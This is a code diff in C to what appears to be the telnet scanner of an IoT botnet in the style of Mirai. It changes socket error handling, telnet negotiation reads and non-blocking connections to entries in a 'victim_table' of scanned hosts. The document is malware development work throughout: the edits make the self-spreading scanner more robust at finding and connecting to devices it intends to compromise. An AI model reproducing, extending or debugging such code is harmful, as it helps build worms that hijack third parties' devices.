@@ -139,16 +139,21 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 	}
 
 	unsigned char mbuf[maxlen + 100];
-
 	while (1)
 	{
-		if (recv(sock, buf, 1, 0) < 0) // Read 1 from socket
+		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) // Read 1 from socket
+		{
+			printd("Error %d: %s", errno, strerror(errno));
 			return 0;
+		}
 		if (*buf == TELNET_CMD)
 		{
 			uint8_t longbuf[4];
-			if (recv(sock, longbuf, 3, 0) <= 0)
+			if (recv(sock, longbuf, 3, MSG_NOSIGNAL) <= 0)
+			{
+				printd("Error %d: %s", errno, strerror(errno));
 				return 0;
+			}
 			scan_negotiate(sock, longbuf, 3);
 		}
 		else
@@ -250,6 +255,7 @@ bool scan_scanner(void)
 		goto end;
 	}
 
+
 	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) == -1)
 	{
 		printd("fcntl() failed to set O_NONBLOCK. Errno: %d | %s", errno, strerror(errno));
@@ -297,7 +303,6 @@ bool scan_scanner(void)
 			Jesus
 			*/
 			struct tcphdr *rtcph = (struct tcphdr *)(riph + 1);
-			errno = 0;
 
 			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
 			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK || errno != 0*/)
@@ -363,11 +368,17 @@ bool scan_scanner(void)
 						}
 						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 						setsockopt(victim_table[i].sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
-						fcntl(victim_table[i].sock, F_SETFL, fcntl(victim_table[i].sock, F_GETFL, NULL) | O_NONBLOCK);
-						if(connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
+
+						if (fcntl(victim_table[i].sock, F_SETFL, O_NONBLOCK | fcntl(victim_table[i].sock, F_GETFL, 0)) == -1)
 						{
+							printd("%d->%s Failed to set nonblocking error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
 							victim_table[i].state = FINISHED;
+						}
+
+						if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
+						{
 							printd("%d->%s Failed to connect", i, ipv4_unpack(victim_table[i].ip));
+							victim_table[i].state = FINISHED;
 						}
 						else
 						{
